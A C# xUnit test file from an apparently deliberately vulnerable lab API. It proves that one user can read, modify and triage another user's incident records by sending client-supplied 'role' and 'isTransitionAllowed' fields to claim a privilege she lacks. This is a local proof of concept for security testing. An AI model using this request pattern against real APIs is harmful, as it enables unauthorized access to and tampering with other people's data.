using System.Net;
using System.Net.Http.Json;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using SecureLab.Api.Data;
using SecureLab.Api.Data.Entities;
using SecureLab.Api.Presentation.Contracts;
using Xunit.Abstractions;

namespace SecureLab.Api.Tests;

// Run only on this controlled vulnerable commit; assertions describe the observed defect.
public sealed class VulnerableAuthorizationProofTests(ITestOutputHelper output)
{
    [Fact]
    public async Task LocalProof_ReadMutationAndPrivilegeBypass()
    {
        await using var factory = new SecureLabApiFactory();
        using var alice = await factory.LoginSeedAsync("alice");
        using var bob = await factory.LoginSeedAsync("bob");
        using var morgan = await factory.LoginSeedAsync("morgan");
        using var me = await morgan.GetAsync("/api/me");
        Assert.Equal(HttpStatusCode.OK, me.StatusCode);
        using var anonymous = factory.CreateClient();
        using var anonMe = await anonymous.GetAsync("/api/me");
        Assert.Equal(HttpStatusCode.Unauthorized, anonMe.StatusCode);
        using var own = await alice.GetAsync($"/api/incidents/{DbSeeder.AliceIncidentId}");
        using var foreign = await alice.GetAsync($"/api/incidents/{DbSeeder.BobIncidentId}");
        Assert.Equal(HttpStatusCode.OK, own.StatusCode);
        Assert.Equal(HttpStatusCode.OK, foreign.StatusCode);
        output.WriteLine("POC READ: Alice own GET=200; identical GET with Bob id=200 (expected deny).");

        using var created = await bob.PostAsJsonAsync("/api/incidents", new
        {
            title = $"LR04-PoC-{Guid.NewGuid():N}", description = "Synthetic local experiment.",
            severity = "Low", occurredAtUtc = DateTimeOffset.UtcNow
        });
        Assert.Equal(HttpStatusCode.Created, created.StatusCode);
        var item = (await created.Content.ReadFromJsonAsync<CreatedIncidentResponse>())!;
        try
        {
            using var mutation = await alice.PutAsJsonAsync($"/api/incidents/{item.Id}",
                new { title = item.Title, description = "Changed by non-owner Alice", role = "Analyst" });
            Assert.Equal(HttpStatusCode.NoContent, mutation.StatusCode);
            var changed = await bob.GetFromJsonAsync<IncidentDetailsResponse>($"/api/incidents/{item.Id}");
            Assert.Equal("Changed by non-owner Alice", changed!.Description);
            output.WriteLine("POC UPDATE: Alice PUT Bob fixture=204; Bob read confirms changed description (expected deny/no change).");
            using var triage = await alice.PostAsJsonAsync($"/api/incidents/{item.Id}/triage",
                new { role = "Analyst", status = "Triaged", isTransitionAllowed = true });
            Assert.Equal(HttpStatusCode.NoContent, triage.StatusCode);
            await using var scope = factory.Services.CreateAsyncScope();
            var db = scope.ServiceProvider.GetRequiredService<SecureLabDbContext>();
            Assert.Equal(IncidentStatus.Triaged, (await db.Incidents.FindAsync(item.Id))!.Status);
            output.WriteLine("POC TRIAGE: Reporter Alice POST Bob fixture=204; New->Triaged despite absent Analyst role.");
        }
        finally
        {
            await using var scope = factory.Services.CreateAsyncScope();
            await scope.ServiceProvider.GetRequiredService<SecureLabDbContext>().Incidents
                .Where(x => x.Id == item.Id).ExecuteDeleteAsync();
        }
    }
}
